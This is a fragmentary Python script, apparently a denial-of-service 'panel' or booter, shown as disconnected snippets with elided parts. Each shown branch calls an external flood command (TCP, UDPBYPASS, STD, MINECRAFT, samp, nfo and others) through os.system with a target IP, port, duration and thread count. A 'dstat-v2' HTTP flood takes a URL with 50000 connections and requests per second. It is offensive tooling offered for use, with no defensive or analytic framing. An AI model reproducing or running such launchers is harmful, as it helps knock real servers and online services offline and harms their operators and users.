...
""")
                os.system(f"TCP {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"UDPBYPASS {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"STD {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"std-v2 {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"MINECRAFT {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"home {ip} {port} {time} {psize}")
            except IndexError:
...
""")
                os.system(f"samp {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"nfo {ip} {port} {time} {threads}")
            except IndexError:
...
""")
                os.system(f"dstat-v2 {url} {connections} {rps} 13.87")
            except IndexError:
                print("Usage : dstat-v2 <url> <connections> <rps>")
                print("Example : dstat-v2 https://example.com 50000 50000")
